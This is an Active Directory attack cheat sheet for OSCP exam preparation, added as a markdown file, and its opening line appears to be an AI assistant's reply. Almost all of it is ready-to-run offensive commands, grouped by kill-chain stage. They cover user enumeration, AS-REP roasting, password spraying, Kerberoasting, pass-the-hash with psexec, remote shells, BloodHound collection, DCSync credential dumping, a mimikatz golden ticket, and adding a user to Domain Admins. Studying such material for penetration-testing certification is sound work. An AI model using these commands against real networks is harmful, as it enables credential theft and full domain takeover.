@@ -1,0 +1,56 @@
+Here’s a **one‑page OSCP Active Directory Quick Reference Sheet** — compact, exam‑style, with the most useful commands mapped to each stage of the kill chain. This is the kind of thing you’d keep beside you while practicing or during the exam.
+
+---
+
+# 📝 OSCP AD Quick Reference
+
+## 1. **Initial Enumeration**
+```bash
+nmap -p 88,135,139,389,445,636,3268,3389,5985 -sV TARGET
+rpcclient -U "" -N TARGET   # enumdomusers, enumdomgroups
+enum4linux-ng -A TARGET
+```
+
+---
+
+## 2. **User & Credential Enumeration**
+```bash
+kerbrute userenum -d DOMAIN --dc-ip TARGET users.txt
+GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip TARGET   # AS-REP roast
+crackmapexec smb TARGET -u users.txt -p 'Password123'      # spray
+```
+
+---
+
+## 3. **Service Exploitation**
+```bash
+smbclient -L //TARGET/ -U "guest"
+evil-winrm -i TARGET -u USER -p PASSWORD
+xfreerdp /u:USER /p:PASSWORD /v:TARGET
+```
+
+---
+
+## 4. **Privilege Escalation**
+```bash
+GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip TARGET -request   # Kerberoast
+psexec.py DOMAIN/USER@TARGET -hashes LMHASH:NTHASH           # Pass-the-Hash
+winPEAS.exe / Seatbelt.exe                                   # Local privesc
+```
+
+---
+
+## 5. **Lateral Movement**
+```bash
+bloodhound-python -ip TARGET -u USER -p PASSWORD -d DOMAIN
+wmiexec.py DOMAIN/USER:PASSWORD@TARGET
+```
+
+---
+
+## 6. **Domain Dominance**
+```bash
+secretsdump.py DOMAIN/USER:PASSWORD@DC   # DCSync
+mimikatz "kerberos::golden ..."          # Golden Ticket
+net group "Domain Admins" USER /add /domain
+```
